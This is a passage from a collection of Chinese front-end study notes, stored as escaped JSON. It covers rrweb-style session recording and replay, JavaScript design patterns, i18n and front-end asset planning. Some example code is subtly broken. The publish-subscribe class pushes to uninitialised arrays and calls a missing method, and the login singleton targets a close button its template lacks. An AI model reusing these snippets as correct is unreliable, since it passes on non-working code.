lastTimestamp;\n      lastTimestamp = record.timestamp;\n\n      // 压缩路径信息\n      if (compressed.target) {\n        compressed.target = this.compressPath(compressed.target);\n      }\n\n      return compressed;\n    });\n  }\n\n  // 使用 IndexedDB 存储记录\n  async saveToIndexedDB(records) {\n    const db = await this.openDB();\n    const transaction = db.transaction(['records'], 'readwrite');\n    const store = transaction.objectStore('records');\n    \n    const compressedRecords = this.compress(records);\n    await store.add({\n      timestamp: Date.now(),\n      records: compressedRecords\n    });\n  }\n}\n```\n\n### 4.2. 批量处理\n\n```javascript\nclass BatchProcessor {\n  constructor() {\n    this.batchSize = 50;\n    this.processingQueue = [];\n    this.isProcessing = false;\n  }\n\n  addToBatch(record) {\n    this.processingQueue.push(record);\n    \n    if (this.processingQueue.length >= this.batchSize) {\n      this.processBatch();\n    }\n  }\n\n  async processBatch() {\n    if (this.isProcessing) return;\n    this.isProcessing = true;\n\n    const batch = this.processingQueue.splice(0, this.batchSize);\n    await this.processRecords(batch);\n\n    this.isProcessing = false;\n    \n    if (this.processingQueue.length > 0) {\n      this.processBatch();\n    }\n  }\n}\n```\n\n## 5. 特殊场景处理\n\n### 5.1. iframe处理\n\n```javascript\n// iframe内容录制\nfunction recordIframe(iframe) {\n  try {\n    const iframeDoc = iframe.contentDocument;\n    if (!iframeDoc) return;\n\n    // 记录iframe初始状态\n    const snapshot = takeInitialSnapshot(iframeDoc);\n    \n    // 监听iframe内部变化\n    const observer = new MutationObserver((mutations) => {\n      // 处理iframe内部DOM变化\n    });\n    \n    observer.observe(iframeDoc, {\n      attributes: true,\n      childList: true,\n      subtree: true,\n      characterData: true\n    });\n  } catch (error) {\n    console.warn('Cannot access iframe content:', error);\n  }\n}\n```\n\n### 5.2. 异步资源加载\n\n```javascript\n// 处理动态加载的资源\nfunction handleAsyncResources() {\n  // 监听资源加载\n  const observer = new PerformanceObserver((list) => {\n    const entries = list.getEntries();\n    entries.forEach(entry => {\n      if (entry.entryType === 'resource') {\n        recordResourceLoad({\n          url: entry.name,\n          type: entry.initiatorType,\n          timestamp: entry.startTime\n        });\n      }\n    });\n  });\n\n  observer.observe({ entryTypes: ['resource'] });\n}\n```\n\n## 6. 安全性考虑\n\n```javascript\n// 敏感信息过滤\nfunction sanitizeData(node) {\n  // 密码输入框处理\n  if (node.type === 'password') {\n    return {\n      ...node,\n      value: '********'\n    };\n  }\n\n  // 敏感类名处理\n  const sensitiveClasses = ['credit-card', 'ssn', 'password'];\n  if (sensitiveClasses.some(cls => node.className?.includes(cls))) {\n    return {\n      ...node,\n      textContent: '[REDACTED]'\n    };\n  }\n\n  return node;\n}\n```\n\n整个时光机的实现需要考虑以下关键点：\n1. 确保录制的完整性和准确性\n2. 优化数据存储和传输效率\n3. 保证回放的流畅性和真实性\n4. 处理好各种边界情况\n5. 注意数据安全和隐私保护\n\n这种实现方式可以帮助开发者：\n- 复现用户操作场景\n- 分析用户行为轨迹\n- 诊断前端异常问题\n- 优化产品体验\n\n## 7. 注意事项与优化建议\n\n- **性能优化**：\n\t- 使用 `Web Workers` 处理数据压缩和解压\n\t- 实现增量更新机制\n\t- 使用 `RequestAnimationFrame` 控制动画\n\t- **采样**\n- **内存管理**：\n\t- 定期清理不需要的记录\n\t- 实现记录分片存储\n\t- ==及时释放==不需要的资源\n- **兼容性处理**：\n\t- 处理不同浏览器的事件差异\n\t- 适配各种 DOM 操作场景\n\t- ==处理特殊元素（Canvas、WebGL等）==\n- **安全性考虑**：\n\t- 实现敏感信息过滤\n\t- 添加用户隐私保护机制\n\t- 控制录制范围\n- **错误处理**：\n\t- 实现优雅降级\n\t- 添加错误恢复机制\n\t- 提供调试信息\n\n","qK63hgDv":"\n# 常见的设计模式\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 模块模式：立即执行函数\n- 发布订阅模式\n- 观察者模式\n- 单例模式\n\t- widow对象\n\t- 状态管理库\n\t- 全局缓存池\n\t- 日志记录器：\n\t- 登录模态框\n\t-  如`jQuery库`、`登陆的弹窗` ，惰性单例等\n- 原型模式：\n\t- 如 `js 的原型链`\n- 适配器模式：\n\t- 如`nodeJS`做聚合\n- 代理模式\n\t- 比如`new Proxy`\n- 装饰器模式\n\t- 比如`@connect` redux 的用法\n\t- NG 的 `@component`\n- 组合模式：\n\t- 我理解像Vue的组合式API，或者 react 自定义`hooks` 也有组合模式的影子\n- 迭代器模式\n\n## 2. 模块模式\n\n```javascript\n// 就是一个闭包，返回一些方法\n// 立即执行函数\nvar counter = (function(){\n    var i = 0;\n    return {\n        get: function(){\n            return i;\n        },\n        set: function(val){\n            i = val;\n        },\n        increment: function(){\n            return ++i;\n        }\n    }\n}());\n```\n\n## 3. 实现一个简易的发布订阅模式\n\n### 3.1. 简易实现\n\n```javascript\nclass Event {\n  constructor(props) {\n    // 事件对象, 事件类型, 回调函数队列\n    this._events = Object.create(null);\n  }\n\n  //订阅事件\n  on(type, fn) {\n    this._events[type].push(fn);\n  }\n\n  // 取消订阅\n  off(type, fn) {\n    // 找this._events[type]下的fn，remove 它\n    // 如果该类型的事件存在，且是数组\n    if (Array.isArray(this._events[type])) {\n      this._events[type] = this._events[type].filter((event) => {\n        return event !== fn && event.origin !== fn;\n      });\n    }\n  }\n\n  // 只订阅一次\n  once(type, fn) {\n    const only = (...args) => {\n      fn.apply(this, args);\n      this.off(type, fn);\n    };\n    only.origin = fn;\n    this.add(type, only);\n  }\n\n  // 触发事件，type 为事件类型，args 为传递的参数\n  emit(type, ...args) {\n    // 遍历执行\n    if (Array.isArray(this._events[type])) {\n      this._events[type].forEach((fn) => {\n        fn.apply(this, args);\n      });\n    }\n  }\n}\n```\n\n### 3.2. 使用\n\n```javascript\n// 使用\n// 使用示例\nconst eventEmitter = new Event();\n\n// 订阅事件\nfunction onMessage(data) {\n  console.log(\"Received message:\", data);\n}\neventEmitter.on(\"message\", onMessage);\n\n// 发布事件\neventEmitter.emit(\"message\", \"Hello, World!\");\n\n// 取消订阅\neventEmitter.off(\"message\", onMessage);\n\n```\n\n## 4. 简易的观察者模式\n\n```javascript\n// 主题类（小宝宝）\nclass Subject {\n  constructor(name) {\n    this.name = name;\n    this.observers = []; // 存储观察者的数组\n    // 小宝宝的状态\n    this.state = \"开心\"; // 难受、开心、生气\n  }\n\n  // 添加观察者\n  add(observer) {\n    this.observers.push(observer);\n  }\n\n  // 移除观察者\n  remove(observer) {\n    const index = this.observers.indexOf(observer);\n    if (index > -1) {\n      this.observers.splice(index, 1);\n    }\n  }\n\n  // 通知所有观察者\n  notify(data) {\n    this.observers.forEach((observer) => observer.update(data));\n  }\n\n  // 某些状态变化时调用，用于通知观察者\n  setState(state) {\n    this.state = state;\n    this.notify(this.state);\n  }\n}\n\n// 观察者类\nclass Observer {\n  constructor(name) {\n    this.name = name;\n  }\n\n  // 当收到主题的通知时调用\n  update(data) {\n    console.log(`${this.name} 观察到了小宝宝状态: ${data}`);\n  }\n}\n\n// 测试代码\n// 创建一个小宝宝主题\nconst baby = new Subject(\"小宝宝\");\n\n// 创建爸爸和妈妈两个观察者\nconst father = new Observer(\"爸爸\");\nconst mother = new Observer(\"妈妈\");\n\n// 爸爸和妈妈订阅小宝宝，关心小宝宝的状态\nbaby.add(father);\nbaby.add(mother);\n\n// 小宝宝状态变化，通知所有观察者\nbaby.setState(\"难受\");\n\n// 输出：\n// 爸爸 观察到了小宝宝状态: 难受\n// 妈妈 观察到了小宝宝状态: 难受\n\n// 小宝宝状态变化，通知所有观察者\nbaby.setState(\"开心\");\n\n// 输出：\n// 爸爸 观察到了小宝宝状态: 开心\n// 妈妈 观察到了小宝宝状态: 开心\n\n// 移除观察者\nbaby.remove(father);\n```\n\n## 5. 单例模式\n\n### 5.1. 使用场景\n\n- `window`对象\n- 登录模态框\n- 全局缓存池\n- 状态管理库：\n\t- 理论上都是一个单例\n- 日志记录器： \n\t- 单例模式可以用于创建一个全局的日志记录器，确保所有日志都通过同一个实例处理\n- 数据库连接池：\n\t- 在需要管理数据库连接的应用中，单例模式可以用来创建和管理连接池，确保高效地重用连接\n\n### 5.2. 简易实现\n\n```javascript hl:3,10,23\nclass Singleton {\n  constructor() {\n    // 如果没有实例，则创建实例\n    if (!Singleton.instance) {\n      // 初始化代码\n      this.data = [];\n      // 保存实例的引用\n      Singleton.instance = this;\n    }\n    // 如果有则返回\n    return Singleton.instance;\n  }\n\n  // 实例方法\n  addItem(item) {\n    this.data.push(item);\n  }\n\n  getItems() {\n    return this.data;\n  }\n  // 静态方法：惰性单例的实现关键点\n  static getInstance() {\n    // 如果没有实例，则创建实例\n    if (!Singleton.instance) {\n      Singleton.instance = new Singleton();\n    }\n    // 如果有则返回\n    return Singleton.instance;\n  }\n}\n\n// 使用示例\nconst instance1 = new Singleton();\nconst instance2 = new Singleton();\n\nconsole.log(instance1 === instance2); // 输出: true\n\ninstance1.addItem(\"Item 1\");\ninstance2.addItem(\"Item 2\");\n\nconsole.log(instance1.getItems()); // 输出: [\"Item 1\", \"Item 2\"]\nconsole.log(instance2.getItems()); // 输出: [\"Item 1\", \"Item 2\"]\n\n```\n\n### 5.3. 使用场景：简易状态管理\n\n```javascript hl:7,6\nclass StateManager {\n  constructor() {\n    if (StateManager.instance) {\n      return StateManager.instance;\n    }\n    this.state = {};\n    StateManager.instance = this;\n  }\n\n  setState(key, value) {\n    this.state[key] = value;\n  }\n\n  getState(key) {\n    return this.state[key];\n  }\n\n  static getInstance() {\n    if (!StateManager.instance) {\n      StateManager.instance = new StateManager();\n    }\n    return StateManager.instance;\n  }\n}\n\n// 使用\nconst stateManager = StateManager.getInstance();\nstateManager.setState('user', { name: 'John', id: 1 });\nconsole.log(stateManager.getState('user')); // { name: 'John', id: 1 }\n\n```\n\n### 5.4. 场景：日志记录\n\n```javascript hl:6,7\nclass Logger {\n  constructor() {\n    if (Logger.instance) {\n      return Logger.instance;\n    }\n    this.logs = [];\n    Logger.instance = this;\n  }\n\n  log(message) {\n    const timestamp = new Date().toISOString();\n    this.logs.push(`${timestamp}: ${message}`);\n    console.log(`${timestamp}: ${message}`);\n  }\n\n  getLogs() {\n    return this.logs;\n  }\n\n  static getInstance() {\n    if (!Logger.instance) {\n      Logger.instance = new Logger();\n    }\n    return Logger.instance;\n  }\n}\n\n// 使用\nconst logger = Logger.getInstance();\nlogger.log(\"User logged in\");\nlogger.log(\"API call failed\");\nconsole.log(logger.getLogs());\n\n```\n\n### 5.5. 模态框\n\n```javascript hl:6,10,15,22\nclass ModalManager {\n  constructor() {\n    if (ModalManager.instance) {\n      return ModalManager.instance;\n    }\n    this.modal = null;\n    ModalManager.instance = this;\n  }\n\n  openModal(content) {\n    this.modal = { content, isOpen: true };\n    this.render();\n  }\n\n  closeModal() {\n    if (this.modal) {\n      this.modal.isOpen = false;\n      this.render();\n    }\n  }\n\n  render() {\n    // 实际应用中，这里会更新DOM\n    console.log(this.modal ? \"Modal is open\" : \"Modal is closed\");\n  }\n\n  static getInstance() {\n    if (!ModalManager.instance) {\n      ModalManager.instance = new ModalManager();\n    }\n    return ModalManager.instance;\n  }\n}\n\n// 使用\nconst modalManager = ModalManager.getInstance();\n// 打开模态框\nmodalManager.openModal(\"Hello World\");\n// 关闭模态框\nmodalManager.closeModal();\n\n```\n\n### 5.6. 模拟登录\n\n通过**单例模式**来实现, 保证页面中只有一个登录框, 且只能通过`getInstance`方法获取\n\n```javascript hl:7,40,45,53\nclass Login {\n  //构造器\n  constructor() {\n    this.init();\n  }\n  //初始化方法\n  init() {\n    //新建div\n    let mask = document.createElement(\"div\");\n    //添加样式\n    mask.classList.add(\"mask-layer\");\n    //添加模板字符串\n    mask.innerHTML = `\n          <div class=\"login-wrapper\">\n            <div class=\"username-input user-input\">\n              <span class=\"login-text\">用户名:</span>\n              <input type=\"text\">\n            </div>\n            <div class=\"pwd-input user-input\">\n              <span class=\"login-text\">密码:</span>\n              <input type=\"password\">\n            </div>\n            <div class=\"btn-wrapper\">\n              <button class=\"confrim-btn\">确定</button>\n              <button class=\"clear-btn\">清空</button>\n            </div>\n          </div>\n  \t\t  `;\n    //插入元素\n    document.body.insertBefore(mask, document.body.childNodes[0]);\n    //注册关闭登录框事件\n    Login.closeLogin();\n  }\n  //静态方法: 获取元素\n  static getLoginDom(cls) {\n    return document.querySelector(cls);\n  }\n\n  // 静态方法: 打开登录框\n  static openLogin() {\n    this.getLoginDom(\".mask-layer\").style = \"display: block\";\n  }\n\n  //静态方法: 注册关闭登录框事件\n  static closeLogin() {\n    this.getLoginDom(\".close-btn\").addEventListener(\"click\", () => {\n      //给遮罩层添加style, 用于隐藏遮罩层\n      this.getLoginDom(\".mask-layer\").style = \"display: none\";\n    });\n  }\n\n  //静态方法: 获取实例(单例)\n  static getInstance() {\n    if (!this.instance) {\n      this.instance = new Login();\n    } else {\n      //移除遮罩层style, 用于显示遮罩层\n      this.getLoginDom(\".mask-layer\").removeAttribute(\"style\");\n    }\n    return this.instance;\n  }\n}\n\n```\n\n### 5.7. 使用方法\n\n```javascript\n// 使用方法:\n// 1. 通过getInstance方法获取实例\nlet login1 = Login.getInstance();\n// 2. 通过openLogin方法打开登录框\nlogin1.openLogin();\n// 3. 通过closeLogin方法关闭登录框\nlogin1.closeLogin();\n\nlet login2 = Login.getInstance();\nlogin2.openLogin();\nlogin2.closeLogin();\n\nlogin1 === login2; // true\n\n```\n\n## 6. 说说常见的设计模式\n\n- 单例：\n\t- 如`jQuery库`、`登陆的弹窗` ，惰性单例等\n- 原型模式：\n\t- 如 `js 的原型链`\n- 适配器模式：\n\t- 如`nodeJS`做聚合\n- 代理模式\n\t- 比如`new Proxy`\n- 装饰器模式\n\t- 如ts中，或者 angular 或者 react 的话，比如`@connect` redux的用法\n- 组合模式：\n\t- 我理解像Vue的组合式API，或者 react 自定义`hooks` 也有组合模式的影子\n- 迭代器模式\n- 发布-订阅模式 、 观察者模式\n\n## 7. 手写单例模式\n\n```javascript\n// class的方式\nclass Single {\n  show() {\n    console.log(\"我是一个单例对象\");\n  }\n  // 静态方法, 用来获取Single类的唯一实例\n  static getInstance() {\n    // 判断是否已经new过1个实例\n    if (!Single.instance) {\n      // 若这个唯一的实例不存在，那么先创建它\n      Single.instance = new Single();\n    }\n    // 如果这个唯一的实例已经存在，则直接返回\n    return Single.instance;\n  }\n}\n```\n\n## 8. 登录单例\n\n```javascript hl:50\nclass Login {\n  //构造器\n  constructor() {\n    this.init();\n  }\n  //初始化方法\n  init() {\n    //新建div\n    let mask = document.createElement(\"div\");\n    //添加样式\n    mask.classList.add(\"mask-layer\");\n    //添加模板字符串\n    mask.innerHTML = `<div class=\"login-wrapper\">\n      <div class=\"username-input user-input\">\n        <span class=\"login-text\">用户名:</span>\n        <input type=\"text\">\n      </div>\n      <div class=\"pwd-input user-input\">\n        <span class=\"login-text\">密码:</span>\n        <input type=\"password\">\n      </div>\n      <div class=\"btn-wrapper\">\n        <button class=\"confrim-btn\">确定</button>\n        <button class=\"clear-btn\">清空</button>\n      </div>\n    </div>\n    `;\n    //插入元素\n    document.body.insertBefore(mask, document.body.childNodes[0]);\n    //注册关闭登录框事件\n    Login.addCloseLoginEvent();\n  }\n\n  //静态方法: 获取元素\n  static getLoginDom(cls) {\n    return document.querySelector(cls);\n  }\n\n  //静态方法: 注册关闭登录框事件\n  static addCloseLoginEvent() {\n    this.getLoginDom(\".close-btn\").addEventListener(\"click\", () => {\n      //给遮罩层添加style, 用于隐藏遮罩层\n      this.getLoginDom(\".mask-layer\").style = \"display: none\";\n    });\n  }\n\n  //静态方法: 获取实例(单例)\n  // 我们调用Login.getInstance()实例化了一个登陆框，\n  // 且在之后的点击中，并没有重新创建新的登陆框，只是移除掉了\"display: none\"这个样式来显示登陆框，节省了内存开销。\n  static getInstance() {\n    // :如果实例不存在, 则创建实例\n    if (!this.instance) {\n      this.instance = new Login();\n      // 否则，展示遮罩层，即显示登陆框\n    } else {\n      // 移除遮罩层style, 用于显示遮罩层\n      this.getLoginDom(\".mask-layer\").removeAttribute(\"style\");\n    }\n    // 返回实例\n    return this.instance;\n  }\n}\n\n```\n\n","tkwccmdF":"\n# 时光机（录制与回放）的技术原理：rrweb\n\n`#前端埋点` `#rrweb`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 定义：Web 会话录制和回放工具\n- 作用：对于**用户行为分析、bug 复现和用户体验研究**非常有价值\n- 三个核心部分\n\t- 记录器（recorder）\n\t- 回放器（player）\n\t- 数据存储（storage）\n- 技术原理\n\t- DOM 序列化\n\t\t- 特殊元素：canvas & iframe svg 、音视频等\n\t- 事件收集\n\t- 增量更新：增量更新机制\n\t- 数据存储\n\t\t- JSON 格式\n\t\t- 支持压缩存储\n\t- 回放重现\n\t\t- 按时间轴线搞\n\t- 隐私&安全\n\t- 性能\n\t\t- 采样率等\n\t\t\t- 比如：对于鼠标移动等高频事件，适当降低采样率\n\t\t\t\t- 每 50ms 采样一次鼠标移动\n\t\t\t\t- 每 150ms 采样一次滚动事件\n\t\t\t\t- 每 500ms 采样一次输入事件\n\t\t- 分片存储大量事件&增量上传\n\t\t- 使用 WebWorker 处理数据\n\t\t- 额外的压缩算法\n\t\t- 存储容量：定时清理\n\t- 扩展：通过插件等\n\n## 2. rrweb 简介\n\n - rrweb (Record and Replay Web) 是一个开源的 Web 会话录制和回放工具\n\t - **可以记录用户在网页上的所有操作**，并能够**完整地重现这些操作**。\n\t - 这个工具对于**用户行为分析、bug 复现和用户体验研究**非常有价值\n\t - 它主要包含三个核心部分：\n\t\t - 记录器（recorder）\n\t\t - 回放器（player）\n\t\t - 数据存储（storage）\n\n## 3. 基本使用方法\n\n### 3.1. 安装\n\n```bash\nnpm install rrweb\n// 或\nyarn add rrweb\n```\n\n### 3.2. 录制\n\n```javascript\nimport rrweb from 'rrweb';\n\n// 开始录制\nlet events = [];\nrrweb.record({\n  emit(event) {\n    events.push(event);\n  },\n});\n```\n\n### 3.3. 回放\n\n```javascript\nimport rrweb from 'rrweb';\n\n// 回放录制的事件\nconst replayer = new rrweb.Replayer(events);\nreplayer.play();\n```\n\n## 4. 技术原理\n\nrrweb 的实现原理主要包含以下几个关键部分：\n- DOM 序列化\n\t- 遍历整个 DOM 树\n\t- 将 DOM 节点转换为可序列化的数据结构\n\t- 记录节点的属性、样式和内容\n\t- **处理特殊元素（如 iframe、canvas 等）**\n- 事件捕获\n\t- 监听用户交互事件（如点击、输入、滚动等）\n\t- 记录鼠标移动轨迹\n\t- 捕获 DOM 变更\n\t- 记录时间戳以确保回放的时序准确性\n- 增量更新：增量更新机制\n\t- 只记录 DOM 变化的部分\n\t- 使用 `MutationObserver` 监听 DOM 变更\n\t- 优化存储空间和传输效率\n- 数据存储\n\t- 将捕获的事件序列化为 JSON 格式\n\t- 支持压缩存储\n\t- 提供事件过滤机制\n- 回放重现\n\t- 重建初始 DOM 快照\n\t- 按时间顺序重放事件\n\t- 模拟用户交互\n\t- 保持时间同步\n- **隐私保护**\n\t- 支持元素屏蔽\n\t- 敏感信息过滤\n\t- 自定义录制规则\n- **性能优化**\n\t- 支持采样率调整\n\t- 提供事件节流\n\t- 支持按需加载\n- **扩展功能**\n\t- 支持插件系统\n\t- 提供自定义事件\n\t- 支持录制控制\n\n### 4.1. 录制原理\n\n- **初始快照**\n\t- 在录制开始时，rrweb 会对整个 DOM 树进行序列化\n\t- 记录所有元素的属性、样式和位置信息\n\t- 收集所有相关的资源（如图片、字体等）\n- **变更记录**\n\t- 使用 `MutationObserver` 监听 DOM 变化\n\t- 记录鼠标移动和点击事件\n\t- 捕获用户输入\n\t- 监听滚动事件\n\t- 记录窗口大小变化\n\n![图片&文件](./files/20241101-73.png)\n代码展示 DOM 变更的监听过程：\n\n```javascript\n// DOM 变更监听示例\nconst observer = new MutationObserver((mutations) => {\n  mutations.forEach((mutation) => {\n    switch (mutation.type) {\n      case 'childList':\n        // 处理节点的添加和删除\n        handleNodeChanges(mutation);\n        break;\n      case 'attributes':\n        // 处理属性变更\n        handleAttributeChanges(mutation);\n        break;\n      case 'characterData':\n        // 处理文本内容变更\n        handleTextChanges(mutation);\n        break;\n    }\n  });\n});\n\n// 配置观察选项\nconst config = {\n  attributes: true,\n  childList: true,\n  characterData: true,\n  subtree: true\n};\n\n// 开始观察\nobserver.observe(document.documentElement, config);\n```\n\n### 4.2. 数据结构\n\nrrweb 记录的事件主要包含以下类型：\n\n```typescript\ninterface Event {\n  type: EventType;\n  data: EventData;\n  timestamp: number;\n}\n\nenum EventType {\n  DomContentLoaded,\n  Load,\n  FullSnapshot,\n  IncrementalSnapshot,\n  Meta,\n  Custom\n}\n```\n\n### 4.3. 回放原理\n\n- **虚拟 DOM 重建**\n\t- 基于初始快照重建 DOM 树\n\t- 创建沙箱环境，避免对实际页面造成影响\n- **增量更新**\n\t- 按时间顺序应用记录的事件\n\t- 重现 DOM 变更\n\t- 模拟用户交互\n- **时间控制**\n\t- 维护事件时间线\n\t- 支持播放、暂停、快进等操作\n\n## 5. 高级功能\n\n### 5.1. 压缩存储\n\n```javascript\nimport { pack, unpack } from 'rrweb';\n\n// 压缩事件数据\nconst packedEvents = pack(events);\n\n// 解压事件数据\nconst unpackedEvents = unpack(packedEvents);\n```\n\n### 5.2. **采样控制**\n\n```javascript hl:6,7,8\nrrweb.record({\n  emit(event) {\n    // 存储事件\n  },\n  sampling: {\n    mousemove: 50, // 每 50ms 采样一次鼠标移动\n    scroll: 150,   // 每 150ms 采样一次滚动事件\n    input: 500     // 每 500ms 采样一次输入事件\n  }\n});\n```\n\n## 6. 性能优化建议\n\n- **采样率调整**\n\t- 根据实际需求调整不同事件的采样频率\n\t- 对于鼠标移动等高频事件，适当降低采样率\n- **数据压缩**\n\t- 使用内置的压缩功能\n\t- 考虑**使用额外的压缩算法**\n- **存储优化**\n\t- 分片存储大量事件\n\t- 实现增量上传\n- **回放优化**\n\t- 使用 WebWorker 处理数据\n\t- 实现懒加载机制\n- **直接上传存储服务**\n\t- 如果要完全重新的话，\n\n## 7. 完全重现的话，建议上传存储服务\n\n因为所有数据都要上传，包括所有的仅在资源，你说呢？？？？\n\n## 8. 安全考虑\n\n### 8.1. **隐私保护**\n\n```javascript\nrrweb.record({\n  emit(event) {\n    // 存储事件\n  },\n  maskAllInputs: true, // 自动屏蔽所有输入框的内容\n  maskInputOptions: {\n    password: true,    // 屏蔽密码输入\n    creditCard: true   // 屏蔽信用卡输入\n  }\n});\n```\n\n### 8.2. **数据脱敏**\n\n- 配置敏感数据过滤规则\n- 实现自定义脱敏逻辑\n\n## 9. 常见应用场景\n\n- **错误重现**\n\t- 记录用户操作步骤\n\t- 辅助开发人员复现问题\n- **用户行为分析**\n\t- 统计用户操作路径\n\t- 生成热力图\n- **产品优化**\n\t- 分析用户使用习惯\n\t- 优化用户体验\n- **质量保证**\n\t- 自动化测试\n\t- 回归测试\n\n## 10. 注意事项\n\n1. **性能影响**\n\t- 监控内存使用\n\t- 控制事件采样率\n\t- 及时清理不需要的记录\n2. **兼容性**\n\t- 检查浏览器支持\n\t- 处理特殊场景（如 iframe）\n\t\t- **SVG**\n\t\t- **音视频视频**\n\t\t- Canvas 等等特殊元素\n3. **存储容量**\n\t- 评估存储需求\n\t- 实现数据==清理策略==\n4. **网络带宽**\n\t- 考虑数据上传策略\n\t- 实现断点续传","o8s9UEGp":"\n# 前端语言包切换\n\n\n`#前端国际化`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 全局状态当前语言\n- 响应式更新\n\n## 2. 要点\n\n这就是单页应用语言切换的核心原理\n1. 状态管理（全局语言状态）\n2. 响应式更新机制\n3. 组件重渲染\n4. 事件订阅发布\n5. 缓存机制\n\n> https://bobi.ink/2023/08/08/i18n-locale/\n\n","cttdKzB5":"\n# 前端资产\n\n `#前端资产`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 技术实体资产\n\t- 组件资产：基础组件、业务组件、区块组件、布局组件\n\t- 工具库：日期、验证工具、格式化、请求库、hooks 库\n\t- 脚手架工具：\n\t\t- 开发组件、开发页面、开发项目、CI/CD 模板\n- 规范与文档资产\n\t- 开发规范\n\t- 最佳实践\n\t- 安全规范\n\t- 性能优化指南\n\t- 踩坑&避坑指南等\n\t- 团队知识库\n\t- 技术分享\n\t- 培训\n\t- 新人指南\n\t\t- 开发环境搭建等\n- 工程化资产\n\t- 各类环境：开发、测试、预发、生成环境\n\t- CI&CD 配置\n\t- 构建模板\n- 业务资产\n\t- 业务组件\n\t- ==业务模型==\n- 测试、质量安全、保障资产\n\t- 测试资产\n\t- ==mock 资产==\n\t- 各类监控\n\t- 日志资产\n\t- CSP配置\n\t- 安全策略\n\t- 安全工具\n\t\t- 代码扫描\n\t\t- 漏洞扫描工具\n- 设计资产\n\t- 设计系统\n\t- 设计资源：sketch,figma\n\t\t- 图标等\n- 数据资产\n\t- 采集 → 上报 → 分析\n- 流程资产\n\t- 开发流程\n\t- 质量保证流程\n\t\t- 发布流程\n\t\t- 线上事故解决流程等\n- ==运营资产==\n\t- 统一的资产管理平台\n\t\t- 使用统计\n\t\t- 权限控制等\n\t\t- 维护成本评估等等\n\t- 反馈机制\n\t\t- 使用情况统计\n\t- 治理\n\t\t- 定期评审\n- 好处：==运营机制促进有质量的沉淀==\n\t- 提高==研效==\n\t- 降低维护成本\n\t\t- 心智成本\n\t\t- 学习成本\n\t- ==沉淀==\n\n## 2. 技术基建资产\n\n### 2.1. 组件库生态\n\n- 基础组件：\n\t- UI组件库\n\t- 布局组件\n- 业务组件库\n\t- 区块组件\n\n````js\n// 1. 基础组件库\n@company/basic-components\n├── Button\n├── Input\n├── Form\n└── ...\n\n// 2. 业务组件库\n@company/business-components\n├── UserCard\n├── OrderFlow\n├── PaymentForm\n└── ...\n\n// 3. 区块组件\n@company/blocks\n├── HeaderBlock\n├── FooterBlock\n├── SidebarBlock\n└── ...\n\n// 4. 布局组件\n@company/layouts\n├── DashboardLayout\n├── PortalLayout\n└── ...\n\n\n````\n\n### 2.2. 工具库集合\n\n```typescript\n// 工具函数库\n@company/utils\n├── date           // 日期处理\n├── validator      // 数据校验\n├── formatter      // 格式化\n└── security       // 安全相关\n\n// 请求库封装\n@company/request\n├── interceptors   // 拦截器\n├── cache         // 缓存策略\n└── retry         // 重试机制\n```\n\n```javascript\n// 示例：通用工具库结构\nexport {\n  // 数据处理\n  formatData,\n  transformTree,\n  \n  // 时间处理\n  formatDate,\n  calculateDuration,\n  \n  // 验证工具\n  validators,\n  \n  // 业务工具\n  businessHelpers\n}\n\n```\n\n### 2.3. 脚手架工具\n\n- 项目初始化模板\n- 页面模板\n- 组件模板\n- **CI/CD 模板**\n\n```bash\n# 项目脚手架\n@company/create-app\n├── templates/     # 项目模板\n│   ├── react-ts\n│   ├── vue-ts\n│   └── mobile\n├── generators/    # 代码生成器\n└── scripts/       # 工具脚本\n\n# 开发工具集\n@company/cli\n├── dev           # 本地开发\n├── build         # 构建打包\n├── deploy        # 部署工具\n└── analyze       # 分析工具\n```\n\n\n> 更多可参考 [2. 如何前端脚手架 \"泼出去的水\" 的问题](#)\n\n## 3. 规范与文档资产\n\n### 3.1. 技术规范文档\n\n#### 3.1.1. 技术文档中心&技术文档体系\n\n- 开发规范\n\t- 编码规范\n\t- Git 分支规范\n\t- Git 提交规范\n\t- 项目目录结构规范\n\t- 命名规范\n\t- 注释规范\n\t- API 接口规范\n- 最佳实践\n\t- React 最佳实践\n\t- Vue 最佳实践\n\t- 性能优化指南\n\t- 安全开发指南\n\t- 测试编写指南\n- 架构设计及规范\n\t- 微前端架构\n\t- 状态管理方案\n\t- 构建部署流程\n\t- 监控告警体系\n\t- 应用分层规范\n\t- 状态管理规范\n\t- API 调用规范\n\t- 错误处理规范\n- 性能规范\n\t- 加载性能标准\n\t- 运行时性能要求\n\t- 内存使用限制\n\t- 打包体积控制\n- 安全规范\n\t- 数据安全处理 \n\t- 用户信息保护 \n\t- XSS 防护措施 \n\t- CSRF 防护措施 \n\n### 3.2. 团队知识库\n\n```bash\n# 团队知识库结构\n技术百科/\n├── 架构设计/\n│   ├── 系统设计方案\n│   └── 技术选型决策\n├── 踩坑指南/\n│   ├── 常见问题解决\n│   └── 性能优化案例\n├── 技术分享/\n│   ├── 周会分享\n│   └── 技术沙龙\n└── 新人指南/\n    ├── 入职培训\n    └── 开发环境搭建\n```\n\n### 3.3. 设计规范\n\n- 视觉设计规范\n- 交互设计规范\n- 动效规范\n- 无障碍设计规范\n\n### 3.4. 培训资料\n\n```javascript\n/training\n  /basic\n    - javascript-fundamentals.md\n    - typescript-guide.md\n    - react-best-practices.md\n  /advanced\n    - performance-optimization.md\n    - security-guidelines.md\n  /business\n    - domain-knowledge.md\n    - business-flows.md\n```\n\n## 4. 工程化资产&基础设施资产\n\n### 4.1. 开发环境\n\n- 本地开发环境配置\n- 测试环境\n- 预发布环境\n- 生产环境\n\n### 4.2. 工具链\n\n```yaml\ndevTools:\n  - name: \"代码编辑器配置\"\n    includes:\n      - VS Code settings\n      - ESLint rules\n      - Prettier config\n  - name: \"构建工具\"\n    includes:\n      - Webpack/Vite配置\n      - Babel设置\n      - PostCSS配置\n```\n\n> cubesonar \n\n### 4.3. CI/CD 配置\n\n````artifact\nid: ci-config\nname: CI/CD配置示例\ntype: code.yaml\ncontent: |-\n  # Jenkins Pipeline\n  pipeline:\n    stages:\n      - lint:\n          script: npm run lint\n      - test:\n          script: npm run test\n      - build:\n          script: npm run build\n      - deploy:\n          script: npm run deploy\n          \n  # 自动化测试\n  test:\n    unit:\n      - jest\n      - enzyme\n    e2e:\n      - cypress\n      - playwright\n    \n  # 监控配置\n  monitor:\n    performance:\n      - lighthouse\n      - web-vitals\n    error:\n      - sentry\n      - 